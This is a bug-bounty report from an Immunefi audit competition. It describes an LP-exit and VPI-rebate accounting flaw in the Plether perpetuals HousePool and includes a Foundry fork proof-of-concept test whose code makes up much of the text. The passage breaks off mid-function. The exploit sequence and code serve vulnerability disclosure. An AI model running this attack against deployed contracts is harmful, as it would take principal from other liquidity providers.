# \#99755 [SC-Critical] Finding 9: Trader-controlled LP exit shifts a VPI rebate onto another Junior L

**Submitted on Nov 15th 2026 at 05:43:22 UTC by @unineko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99755
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

**Severity: Critical — direct theft of Junior LP principal under the [Plether competition scope](https://immunefi.com/audit-competition/plether/scope/).** A trader who also owns Junior shares can pay positive virtual price impact (VPI) on an open, take that cash out through a matured LP redemption, and then close the position for a Pool-funded VPI rebate borne by the remaining LPs. In the pinned deployed-v2 fork with the permitted external Pyth mock, the attacker receives **14,000,386.199721 USDG** after contributing **14,000,000 USDG**, while an independent Junior LP receives **8,006,414.399209 USDG** against its **8,010,000 USDG** deposit. The matched close-first control pays that LP **6,465.136114 USDG more** with the same close fill, paid rebate, fee, and realized price PnL. The attacker does not need a pending close order during LP settlement. The attacker's surplus is before external costs.

## Finding Description

On an open, [`CfdEngineSettlementSidecar.executeOpen()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L445-L463) transfers positive VPI to the Pool and records the cash as `Revenue`, although a later close may rebate part of that same position's paid VPI under the lifetime clamp. [`CfdEngineProtocolLens.getHousePoolInputSnapshot()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineProtocolLens.sol#L59-L74) gives LP accounting physical Pool assets, marked price PnL, trader claims, and the settlement buffer without reserving the contingent rebate. [`HousePool.settleLpEpoch()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L823-L883) can fund a matured Junior redemption from value that includes the opening VPI. The same actor can then close and receive a Pool-funded rebate through [`executeClose()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L618-L624), leaving independent LPs to absorb the outflow after the attacker has cashed out.

The demonstrated sequence uses public trader, LP, and permissionless keeper actions:

1. The attacker and an independent victim deposit into Junior. The attacker also funds a trading account, requests redemption of all attacker shares, and waits for the redemption epoch to mature.
2. The attacker opens a LONG through the released V3 Router. Positive VPI increases pool cash while the position is still open.
3. In the primary attack branch, a caller settles the matured LP epoch and the attacker claims the funded portion **while no close order is pending**. The attacker then commits and executes the close. The remaining attacker shares and the victim's shares are later fully redeemed. The control branch commits and executes the same close **before** the first LP funding, using the same fresh close tick.

The primary matched branches have the **same close fill, realized price PnL, paid close rebate, close VPI, and explicit fee**. Trader cash differs by only **0.005851 USDG** from carry checkpoint timing. The material transfer occurs in the Junior LP cash-outs, not through an increased rebate to the trader. A second matched test, with the close already committed before LP settlement, holds trader cash exactly equal. The [previously listed AI scan](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L1742-L1755) concerns a _larger close rebate_ caused by lower Pool depth. Here the paid rebate is unchanged, and the primary witness settles the LP epoch before any close order exists. The cash-out sequence does not rely on a depth-amplified rebate or a pending-order accounting gap.

The [documented accounting policy](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L849-L872) keeps anticipated VPI outside the pre-close _price_ book and makes rebates conditional on free Pool cash. This finding does not treat every opening VPI payment as an immediately owed rebate. The exploit is the actor-controlled round trip: an LP/trader can withdraw value that includes its own opening VPI, then exercise the permitted rebate path so another LP cohort funds the later payment. The documented conditional-rebate rule does not protect that cohort transition.

The [lifetime VPI clamp](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L117) prevents a trader from receiving more VPI rebate than that position accrued. It does not account for cash the same actor has already withdrawn as a Junior LP. The PoC's rebate stays within the clamp; the combined trader and LP cash-out is profitable because the remaining LP bears the rebate after the attacker exits.

## Impact Explanation

In the primary fork, the independent LP ultimately redeems **8,006,414.399209 USDG** against **8,010,000 USDG** contributed: its realized receipt is **3,585.600791 USDG below deposited principal**. With the same trade closed before LP funding, the LP instead receives **8,012,879.535323 USDG**. The attack ordering therefore reduces its realized wallet cash by **6,465.136114 USDG**, while the attacker's combined LP and trader wallet finishes **386.199721 USDG above its 14,000,000-USDG contribution after protocol charges**. The victim's full redemption realizes the impairment in its wallet; the attacker cannot force the victim's redemption, but the Pool-funded close has already shifted value away from the remaining Junior cohort. A supplementary zero-confidence comparison removes realized price PnL and still shows victim principal loss and attacker surplus, though its rebate changes slightly with Pool depth. This is the [scope's Critical direct-theft-of-user-funds impact](https://immunefi.com/audit-competition/plether/scope/) when the attacker-controlled transfer is evaluated as an exploit, rather than a claim for unclaimed yield.

## Likelihood Explanation

No privileged role or private keeper access is needed: the LP, trader, and Router keeper paths used in the PoC are public. The tested route requires a matured Junior exit, positive opening VPI, a close that earns a paid rebate, and an independent remaining Junior LP. The fork starts at the released v2.0.0 launch snapshot, adds the attacker and victim positions, and uses **14,000,000 USDG** of attacker capital. Pool depth and trade size affect profitability; this PoC proves the stated profitable launch-snapshot configuration, not that an identical trade is profitable at every later Pool state. The primary equal-rebate branch uses six synthetic Pyth feeds with a uniform **998 ppm** confidence ratio, near the protocol's **1,000 ppm** cap. Availability of authentic signed updates with that confidence and timing is unverified. The external Pyth endpoint is mocked as permitted for competition PoCs, so no authenticated packet sequence or live market execution is claimed.

Foundry's per-test gas includes both counterfactual branches and later cash-outs, so it is not one transaction's cost. The PoC measures profit after protocol charges but does not measure Arbitrum gas/data posting, market-data acquisition, capital carrying cost, or slippage from an authentic signed price path. These are execution and payout considerations; the [competition's feasibility rules](https://immunefi.com/audit-competition/plether/scope/) assess capital and risk separately from the demonstrated impact. An independent Junior LP can lose principal to an actor who chose both the VPI-generating trade and the timing of its LP exit without a change in close execution economics.

## Recommendation

Consider tracking the refundable portion of positive opening VPI by position and excluding that amount from distributable LP value and redemption funding until the rebate right expires or is settled. Apply one consistent adjustment to both LP pricing and withdrawal capacity, including partial closes and position increases. If VPI is instead held outside revenue until it becomes final, avoid subtracting the same amount again in the pool snapshot.


## Proof of Concept

## Proof of Concept

The attached `finding9_poc.t.sol` pins Arbitrum Sepolia block **323664343** after v2.0.0 activation. It uses the deployed Router, Engine, Pool, Junior Vault, clearinghouse, and Oracle, and checks their critical deployed runtime code hashes before the scenario. Only the external Pyth contract is replaced by a deterministic mock; the repository's standard local ArbSys precompile shim supports fork execution. The deployed settlement token is a publicly mintable MockUSDG, used to provision the test actors. No in-scope contract is replaced or modified.

Run from `packages/perps` with an archive Arbitrum Sepolia RPC:

```sh
FINDING9_FORK_RPC_URL=https://arbitrum-sepolia.gateway.tenderly.co forge test --match-path test/perps/finding9_poc.t.sol -vv
```

Selected verified output (balances are **USDG atoms**, with six decimals):

```text
[PASS] testFork_LpExitBeforeCloseCommitStillTransfersCash()
  deferred-close attacker LP premium (USDG atoms) 6465142763
  deferred-close victim shortfall (USDG atoms) 6465136114
  deferred-close attacker total cash (USDG atoms) 14000386199721
  deferred-close control attacker total cash (USDG atoms) 13993921062809
  deferred-close victim cash (USDG atoms) 8006414399209
  deferred-close control victim cash (USDG atoms) 8012879535323
  deferred-close trader cash difference (USDG atoms) 5851
  deferred-close paid rebate (USDG atoms) 12783223578
[PASS] testFork_PositiveVpiLpExitBeforeCloseTransfersCashFromRemainingLp()
[PASS] testFork_ZeroConfidenceStillTransfersCashWithoutPricePnl()
Suite result: ok. 3 passed; 0 failed; 0 skipped
```

The primary test in `finding9_poc.t.sol` asserts that no close order is pending during LP settlement, that the LP cash claim is paid before the close commitment, and that the paid rebate and other close economics match the close-first control. The earlier near-cap test additionally holds trader cash exactly equal with the close already committed. The zero-confidence test asserts zero realized price PnL; its close rebate changes slightly with Pool depth, so it is only supplementary. In that branch the victim receives **8,003,615.335223 USDG** against **8,010,000 USDG** contributed, while the attacker receives **14,003,184.465528 USDG** against **14,000,000 USDG** contributed, before external costs.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {RecordedOrderReceipts} from "./../utils/RecordedOrderReceipts.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineSettlementSidecar} from "@plether/perps/interfaces/ICfdEngineSettlementSidecar.sol";
import {ArbitrumForkSupport} from "@plether/test-utils/ArbitrumForkSupport.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";

interface IForkMockUSDG is IERC20 {

    function mint(
        address to,
        uint256 amount
    ) external;

}

/// @notice Real deployed v2.0.0 Arbitrum Sepolia end-to-end PoC for the open-VPI / LP-exit / close-rebate flaw.
/// @dev All in-scope protocol contracts and state come from the pinned post-activation fork. Their runtime
///      hashes must match the release manifest. External Pyth is replaced by a deterministic test oracle;
///      the test also installs the standard local ArbSys precompile shim used by this repository's fork tests.
///      The release's settlement token is itself a freely mintable MockUSDG; actor minting is setup only.
///      Public attack calls are made as an LP/trader or permissionless keeper, never the protocol owner.
///      Requires an archive Arbitrum Sepolia RPC with historical state at block 323664343.
///      From the repository root, first run `cd packages/perps`. Then run:
///      FINDING9_FORK_RPC_URL=<archive-rpc> FOUNDRY_TEST=test/perps forge test \
///        --match-path test/perps/finding9_poc.t.sol -vv --ignored-error-codes 6335 \
///        -o /tmp/plether-f9-out --cache-path /tmp/plether-f9-cache
contract Finding9ForkPoCTest is RecordedOrderReceipts {

    uint256 private constant FORK_BLOCK = 323_664_343; // Activation complete; later liquidity txs not yet included.
    uint256 private constant START_TIME = 1_793_620_800; // 2026-11-02 12:00 UTC, Monday outside FAD.
    uint256 private constant CONFIDENCE_BPS = 10;
    uint256 private inputConfidencePpm = 998;
    bool private commitCloseBeforeSnapshot = true;
    uint256 private constant ATTACKER_LP_DEPOSIT = 12_000_000e6;
    uint256 private constant VICTIM_LP_DEPOSIT = 8_010_000e6;
    uint256 private constant TRADER_DEPOSIT = 2_000_000e6;
    uint256 private constant POSITION_SIZE = 8_000_000e18;
    uint256 private constant OPEN_MARGIN = 1_000_000e6;

    address private constant ATTACKER = address(0xA770);
    address private constant VICTIM = address(0xB770);
    address private constant KEEPER = address(0xB0B0);
    address private constant USDG_ADDRESS = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address private constant CLEARINGHOUSE_ADDRESS = 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A;
    address private constant ENGINE_ADDRESS = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address private constant POOL_ADDRESS = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address private constant JUNIOR_ADDRESS = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address private constant ORACLE_ADDRESS = 0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2;
    address private constant ROUTER_ADDRESS = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address private constant PYTH_ADDRESS = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;

    // The six released feed IDs, bases, and inversion flags from DeployPerpsArbitrumSepolia.s.sol.
    bytes32[6] private feedIds = [
        bytes32(0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b),
        bytes32(0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52),
        bytes32(0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1),
        bytes32(0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca),
        bytes32(0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676),
        bytes32(0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8)
    ];
    uint256[6] private basePrices = [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];

    IForkMockUSDG private usdg = IForkMockUSDG(USDG_ADDRESS);
    MarginClearinghouse private clearinghouse = MarginClearinghouse(CLEARINGHOUSE_ADDRESS);
    CfdEngine private engine = CfdEngine(ENGINE_ADDRESS);
    HousePool private pool = HousePool(POOL_ADDRESS);
    TrancheVault private juniorVault = TrancheVault(JUNIOR_ADDRESS);
    OrderRouter private router = OrderRouter(ROUTER_ADDRESS);
    PletherOracle private oracle = PletherOracle(ORACLE_ADDRESS);

    struct Branch {
        uint256 attackerLpCash;
        uint256 victimLpCash;
        uint256 traderCash;
        uint256 attackerTotalCash;
        uint256 firstFundedShares;
        uint256 firstClaimCash;
        uint256 closeFill;
        uint256 closeNeutralMark;
        int256 closeVpi;
        int256 closeRealizedPnl;
        uint256 closeExecutionFee;
        uint256 closePoolCashPaid;
        uint256 closeTraderCreditIncrease;
        uint256 closeRebatePaid;
    }

    struct Prepared {
        uint256 attackerShares;
        uint256 victimShares;
        uint256 exitId;
        uint64 closeId;
        uint256 closeCommitTime;
        uint256 openPublishTime;
        uint256 openFill;
        uint256 neutralMark;
        uint256 openVpi;
        uint256 poolAfterOpen;
    }

    function setUp() public {
        string memory rpc = vm.envOr("FINDING9_FORK_RPC_URL", string(""));
        require(bytes(rpc).length != 0, "FINDING9_FORK_RPC_URL archive RPC required");
        vm.createSelectFork(rpc, FORK_BLOCK);
        assertEq(block.chainid, 421_614, "Arbitrum Sepolia fork");
        ArbitrumForkSupport.install(); // Local block-number shim at the ArbSys precompile only.
        _assertReleaseCode();
        assertEq(address(oracle.pyth()), PYTH_ADDRESS, "release oracle Pyth binding");
        assertTrue(pool.isTradingActive(), "release trading activated");
        assertEq(pool.totalAssets(), 2e6, "only the two one-USDG permanent seeds are funded");
        assertEq(pool.juniorPrincipal(), 1e6, "Junior seed");
        assertEq(pool.seniorPrincipal(), 1e6, "Senior seed");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(oracle.basketMaxConfidenceRatioBps(), CONFIDENCE_BPS, "release confidence cap");
        assertEq(oracle.adverseConfidenceMultiplierBps(), 2500, "release adverse confidence multiplier");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "release open minimum");

        // Pyth is external to the scoped protocol. Erase its previous storage after replacing only its
        // runtime, so this deterministic MockPyth starts from a clean state at the immutable oracle address.
        vm.etch(PYTH_ADDRESS, type(MockPyth).runtimeCode);
        for (uint256 slot; slot < 12; ++slot) {
            vm.store(PYTH_ADDRESS, bytes32(slot), bytes32(0));
        }
        vm.warp(START_TIME);
        _fundJunior(VICTIM, VICTIM_LP_DEPOSIT);
        _fundJunior(ATTACKER, ATTACKER_LP_DEPOSIT);
        _fundTrader(ATTACKER, TRADER_DEPOSIT);
    }

    function _assertReleaseCode() private view {
        assertEq(USDG_ADDRESS.codehash, 0x12233a5f6b0abf6a0f8447e56f9507afdd142a78cc42ebb0d041a3997bd299f6);
        assertEq(CLEARINGHOUSE_ADDRESS.codehash, 0xc8e4965893dbd7073303303e9d5ab9c775aabcc1259635e4993fc7fdb0681398);
        assertEq(ENGINE_ADDRESS.codehash, 0xa0f8e5be6e622a5a83e46e88f6b012757ef924cf613a50cba52a2b5c66b76a6b);
        assertEq(POOL_ADDRESS.codehash, 0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957);
        assertEq(JUNIOR_ADDRESS.codehash, 0x8d00d3d0273b7a321cbf61232ea79ef0b503fe0d83bb52609321765a0a04f3bf);
        assertEq(ORACLE_ADDRESS.codehash, 0x1ecb1ca760e7ba51d958697eeefe06ff7ba1a3ad162b3e7978af3df30393bc13);
        assertEq(ROUTER_ADDRESS.codehash, 0x6c65de67ef2824572537e3641a71100100c49d909b196c43e5d271312534d3cf);
        assertEq(
            address(engine.settlementSidecar()).codehash,
            0x540083c758046571c5770f9950282eef938986ff41d78538109ddf549534b059
        );
        assertEq(
            address(router.lifecycleBook()).codehash, 0xc3f34d5c32716e1818e1ae1cf5e14892a639bc35f15894610e619afe648ba554
        );
    }

    function testFork_PositiveVpiLpExitBeforeCloseTransfersCashFromRemainingLp() public {
        Prepared memory prepared = _prepareScenario(true);
        (Branch memory attack, Branch memory closeFirst) = _matchedBranches(prepared);
        _assertScenario(prepared, attack, closeFirst);
    }

    /// @notice The same public attack with zero feed confidence isolates VPI transfer from price PnL.
    function testFork_ZeroConfidenceStillTransfersCashWithoutPricePnl() public {
        inputConfidencePpm = 0;
        Prepared memory prepared = _prepareScenario(true);
        (Branch memory attack, Branch memory closeFirst) = _matchedBranches(prepared);
        _assertScenario(prepared, attack, closeFirst);
    }

    /// @notice An LP can take opening VPI before any close order exists, then commit and collect the rebate later.
    /// @dev This isolates the LP-cohort transfer from a pending-order LP settlement interaction.
    function testFork_LpExitBeforeCloseCommitStillTransfersCash() public {
        commitCloseBeforeSnapshot = false;
        Prepared memory prepared = _prepareScenario(true);
        assertEq(router.nextExecuteId(), 0, "no pending order at the branch point");
        (Branch memory attack, Branch memory closeFirst) = _matchedBranches(prepared);
        _assertDeferredCloseScenario(prepared, attack, closeFirst);
    }

    function _matchedBranches(
        Prepared memory prepared
    ) private returns (Branch memory attack, Branch memory control) {
        uint256 checkpoint = vm.snapshotState();
        if (commitCloseBeforeSnapshot) {
            attack = _runBranch(
                true,
                prepared.exitId,
                prepared.attackerShares,
                prepared.victimShares,
                prepared.closeId,
                prepared.closeCommitTime,
                0
            );
        } else {
            attack =
                _runCloseCommittedAfterLpBranch(true, prepared.exitId, prepared.attackerShares, prepared.victimShares);
        }
        assertTrue(vm.revertToState(checkpoint), "restore same orders, margin, LP shares, and oracle state");
        if (commitCloseBeforeSnapshot) {
            control = _runBranch(
                false,
                prepared.exitId,
                prepared.attackerShares,
                prepared.victimShares,
                prepared.closeId,
                prepared.closeCommitTime,
                0
            );
        } else {
            control =
                _runCloseCommittedAfterLpBranch(false, prepared.exitId, prepared.attackerShares, prepared.victimShares);
        }
    }

    function _prepareScenario(
        bool expectPositiveVpi
    ) private returns (Prepared memory prepared) {
        prepared.attackerShares = juniorVault.balanceOf(ATTACKER);
        prepared.victimShares = juniorVault.balanceOf(VICTIM);

        // Public attack actions begin here: queue a full LP exit, then pay positive VPI on a live LONG.
        uint256 cooldownEnd = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < cooldownEnd) {
            vm.warp(cooldownEnd);
        }
        vm.prank(ATTACKER);
        prepared.exitId = juniorVault.requestRedeem(prepared.attackerShares, ATTACKER, ATTACKER);
        vm.warp(pool.lpEpochStart(prepared.exitId));
        uint256 initialMarkTime = vm.getBlockTimestamp();
        vm.prank(KEEPER);
        router.updateMarkPrice(_basket(initialMarkTime, initialMarkTime - 1));
        uint256 openCommitTime = vm.getBlockTimestamp();
        uint64 openId = _commit(false);
        vm.roll(block.number + 1);
        vm.warp(openCommitTime + 1);
        uint256 poolBeforeOpen = usdg.balanceOf(address(pool));
        _startRecordingLogs();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory openResult =
            router.executeOrder(openId, _basket(openCommitTime + 1, openCommitTime));
        assertEq(uint8(openResult.status), uint8(OrderV3Types.LifecycleStatus.Executed), "V3 open executes");
        OrderV3Types.OrderReceipt memory openReceipt = _verifiedReceipt(router.lifecycleBook(), openId);
        if (expectPositiveVpi) {
            assertGt(openReceipt.economics.vpiAssets, 0, "open pays positive VPI to Pool");
        } else {
            assertEq(openReceipt.economics.vpiAssets, 0, "zero-factor open has no VPI");
        }
        assertEq(openReceipt.oraclePublishTime, openCommitTime + 1, "open uses first post-commit tick");
        prepared.openPublishTime = openCommitTime + 1;
        assertEq(openReceipt.account, ATTACKER);
        assertEq(engine.executionFeeBps(), 4);
        assertGt(openReceipt.economics.executionFeeAssets, 0, "open pays the four-bps execution fee");
        prepared.poolAfterOpen = usdg.balanceOf(address(pool));
        // In this release config the execution fee is separately credited to treasury; observed net Pool cash
        // increases by the VPI charge. This compares actual custody, not gross trade charges in general.
        assertEq(
            prepared.poolAfterOpen - poolBeforeOpen,
            uint256(openReceipt.economics.vpiAssets),
            "opening VPI is immediately recognized as Pool cash"
        );
        prepared.openFill = openReceipt.executionPrice;
        prepared.neutralMark = openReceipt.neutralMarkPrice;
        prepared.openVpi = uint256(openReceipt.economics.vpiAssets);
        if (commitCloseBeforeSnapshot) {
            prepared.closeId = _commit(true);
            prepared.closeCommitTime = vm.getBlockTimestamp();
        }
    }

    function _assertScenario(
        Prepared memory prepared,
        Branch memory attack,
        Branch memory control
    ) private view {
        uint256 attackerPremium = attack.attackerLpCash - control.attackerLpCash;
        uint256 victimShortfall = control.victimLpCash - attack.victimLpCash;
        console2.log("open VPI charged (USDG atoms)", prepared.openVpi);
        console2.log("Pool cash immediately after open", prepared.poolAfterOpen);
        console2.log("attacker total LP cash, funding before close", attack.attackerLpCash);
        console2.log("attacker LP cash, close before funding", control.attackerLpCash);
        console2.log("attacker first-funded shares", attack.firstFundedShares);
        console2.log("attacker cash paid before close", attack.firstClaimCash);
        console2.log("attacker total shares", prepared.attackerShares);
        console2.log("victim LP cash, funding before close", attack.victimLpCash);
        console2.log("victim LP cash, close before funding", control.victimLpCash);
        console2.log("attacker incremental LP cash", attackerPremium);
        console2.log("victim cash shortfall vs close-first control", victimShortfall);
        console2.log("attacker USDG after protocol charges, before external fees", attack.attackerTotalCash);
        console2.log("control attacker actual cash USDG atoms", control.attackerTotalCash);
        console2.log("paid close rebate USDG atoms", attack.closeRebatePaid);

        assertGt(prepared.openFill, 0, "the shared open filled at a real basket price");
        assertEq(attack.closeFill, control.closeFill, "same encoded close tick in both branches");
        assertEq(attack.closeRealizedPnl, control.closeRealizedPnl, "same close price PnL in both branches");
        assertGt(attack.closePoolCashPaid, 0, "Pool actually pays cash on close");
        assertGt(attack.closeTraderCreditIncrease, 0, "trader actually receives close credit");
        assertGt(attack.closeRebatePaid, 0, "close action rebate is actually paid");
        assertGt(control.closeRebatePaid, 0, "control close rebate is actually paid");
        assertLt(attack.closeVpi, 0, "close rebates the positive opening VPI");
        assertLt(control.closeVpi, 0, "control close also rebates VPI");
        assertEq(attack.closeExecutionFee, control.closeExecutionFee, "same explicit close fee");
        if (inputConfidencePpm == 0) {
            _assertZeroConfidenceScenario(prepared, attack, control, attackerPremium, victimShortfall);
        } else {
            _assertEqualRebateScenario(attack, control, attackerPremium, victimShortfall);
        }
        assertGt(attackerPremium, 6000e6, "funding while VPI remains open benefits exiting LP");
        assertGt(victimShortfall, 6000e6, "remaining LP pays the later rebate");
        assertGt(
            attack.attackerTotalCash,
            ATTACKER_LP_DEPOSIT + TRADER_DEPOSIT,
            "attacker profits in actual USDG after protocol charges, before external fees"
        );
        assertLt(attack.victimLpCash, VICTIM_LP_DEPOSIT, "victim loses actual contributed USDG");
        assertGe(control.victimLpCash, VICTIM_LP_DEPOSIT, "victim principal is whole in close-first control");
        assertLt(
            control.attackerTotalCash,
            ATTACKER_LP_DEPOSIT + TRADER_DEPOSIT,
            "attacker loses money in close-first control"
        );
    }

    function _assertZeroConfidenceScenario(
        Prepared memory prepared,
        Branch memory attack,
        Branch memory control,
        uint256 attackerPremium,
        uint256 victimShortfall
    ) private pure {
        assertEq(prepared.openFill, prepared.neutralMark, "no opening adverse fill");
        assertEq(attack.closeRealizedPnl, 0, "no price PnL to explain the cash transfer");
        assertEq(control.closeRealizedPnl, 0, "control likewise has no price PnL");
        uint256 extraRebate = uint256(control.closeVpi - attack.closeVpi);
        assertEq(
            attack.traderCash - control.traderCash,
            extraRebate,
            "the small trader difference is only depth-dependent VPI"
        );
        assertApproxEqAbs(attackerPremium + extraRebate, victimShortfall, 1e6, "zero-price-PnL transfer is VPI-funded");
        assertEq(
            attack.attackerTotalCash - control.attackerTotalCash,
            attackerPremium + extraRebate,
            "zero-confidence attacker gain includes the additional VPI rebate"
        );
    }

    function _assertEqualRebateScenario(
        Branch memory attack,
        Branch memory control,
        uint256 attackerPremium,
        uint256 victimShortfall
    ) private pure {
        // Both closes hit the same lifetime rebate cap, despite different LP-funded Pool depths.
        assertEq(attack.closeVpi, control.closeVpi, "same trader VPI rebate in both branches");
        assertEq(attack.closeRebatePaid, control.closeRebatePaid, "same paid action rebate in both branches");
        assertEq(attack.traderCash, control.traderCash, "identical trader settlement economics");
        assertApproxEqAbs(attackerPremium, victimShortfall, 1e6, "cash transfer conserves LP value");
        assertEq(
            attack.attackerTotalCash - control.attackerTotalCash,
            attackerPremium,
            "attacker gain comes from LP redemption, not different trading"
        );
    }

    function _assertDeferredCloseScenario(
        Prepared memory prepared,
        Branch memory attack,
        Branch memory control
    ) private pure {
        uint256 attackerPremium = attack.attackerLpCash - control.attackerLpCash;
        uint256 victimShortfall = control.victimLpCash - attack.victimLpCash;
        uint256 traderCashDifference = attack.traderCash > control.traderCash
            ? attack.traderCash - control.traderCash
            : control.traderCash - attack.traderCash;
        console2.log("deferred-close attacker LP premium (USDG atoms)", attackerPremium);
        console2.log("deferred-close victim shortfall (USDG atoms)", victimShortfall);
        console2.log("deferred-close attacker total cash (USDG atoms)", attack.attackerTotalCash);
        console2.log("deferred-close control attacker total cash (USDG atoms)", control.attackerTotalCash);
        console2.log("deferred-close victim cash (USDG atoms)", attack.victimLpCash);
        console2.log("deferred-close control victim cash (USDG atoms)", control.victimLpCash);
        console2.log("deferred-close trader cash difference (USDG atoms)", traderCashDifference);
        console2.log("deferred-close paid rebate (USDG atoms)", attack.closeRebatePaid);

        assertGt(prepared.openVpi, 0, "open VPI was collected before the exit");
        assertGt(attack.firstClaimCash, 0, "attacker receives actual USDG before close commitment");
        assertEq(attack.closeFill, control.closeFill, "same close fill in both branches");
        assertEq(attack.closeRealizedPnl, control.closeRealizedPnl, "same realized price PnL");
        assertEq(attack.closeExecutionFee, control.closeExecutionFee, "same explicit close fee");
        assertEq(attack.closeVpi, control.closeVpi, "same close VPI despite the earlier LP exit");
        assertLt(attack.closeVpi, 0, "close rebates opening VPI");
        assertEq(attack.closeRebatePaid, control.closeRebatePaid, "same actual pool-funded close rebate");
        assertGt(attack.closePoolCashPaid, 0, "pool pays the rebate after the exit");
        assertGt(attack.closeTraderCreditIncrease, 0, "trader receives the rebate after the exit");
        assertLt(traderCashDifference, 10_000, "only sub-cent carry timing affects trader cash");
        assertApproxEqAbs(
            attack.attackerTotalCash - control.attackerTotalCash,
            victimShortfall,
            10_000,
            "attacker gain tracks third-party LP cash loss"
        );
        assertGt(attackerPremium, 6000e6, "early redemption gains more than 6000 USDG");
        assertGt(victimShortfall, 6000e6, "remaining LP loses more than 6000 USDG");
        assertGt(
            attack.attackerTotalCash,
            ATTACKER_LP_DEPOSIT + TRADER_DEPOSIT,
            "attacker ends above nominal contributed capital before external costs"
        );
        assertLt(attack.victimLpCash, VICTIM_LP_DEPOSIT, "victim loses principal in actual wallet cash");
        assertGe(control.victimLpCash, VICTIM_LP_DEPOSIT, "control victim receives at least principal");
    }

    function _runBranch(
        bool fundBeforeClose,
        uint256 exitId,
        uint256 attackerShares,
        uint256 victimShares,
        uint64 closeId,
        uint256 closeCommitTime,
        int256 closeDriftPpm
    ) private returns (Branch memory result) {
        uint256 executionTime = closeCommitTime + 1;
        bytes[] memory sameFreshTick = _basketWithDrift(executionTime, closeCommitTime, closeDriftPpm);
        vm.roll(block.number + 1);
        vm.warp(executionTime);
        if (fundBeforeClose) {
            vm.prank(KEEPER);
            router.settleLpEpoch(sameFreshTick);
            result.firstFundedShares = juniorVault.claimableRedeemRequest(exitId, ATTACKER);
            assertGt(result.firstFundedShares, 0, "pre-close LP funding is real");
            vm.prank(ATTACKER);
            result.firstClaimCash = juniorVault.claimRedeem(exitId, result.firstFundedShares, ATTACKER, ATTACKER);
            result.attackerLpCash = result.firstClaimCash;
            _executeClose(closeId, sameFreshTick, result);
        } else {
            _executeClose(closeId, sameFreshTick, result);
            vm.prank(KEEPER);
            router.settleLpEpoch(sameFreshTick);
            result.firstFundedShares = juniorVault.claimableRedeemRequest(exitId, ATTACKER);
            assertGt(result.firstFundedShares, 0, "control LP funding is real");
            vm.prank(ATTACKER);
            result.firstClaimCash = juniorVault.claimRedeem(exitId, result.firstFundedShares, ATTACKER, ATTACKER);
            result.attackerLpCash = result.firstClaimCash;
        }
        assertGt(result.firstClaimCash, 0, "first funding pays actual USDG cash");

        return _finishBranch(exitId, attackerShares, victimShares, closeDriftPpm, result);
    }

    function _runCloseCommittedAfterLpBranch(
        bool fundBeforeClose,
        uint256 exitId,
        uint256 attackerShares,
        uint256 victimShares
    ) private returns (Branch memory result) {
        uint256 closeCommitTime = vm.getBlockTimestamp() + 1;
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(closeCommitTime);
        if (fundBeforeClose) {
            assertEq(router.nextExecuteId(), 0, "no close commitment during LP settlement");
            vm.prank(KEEPER);
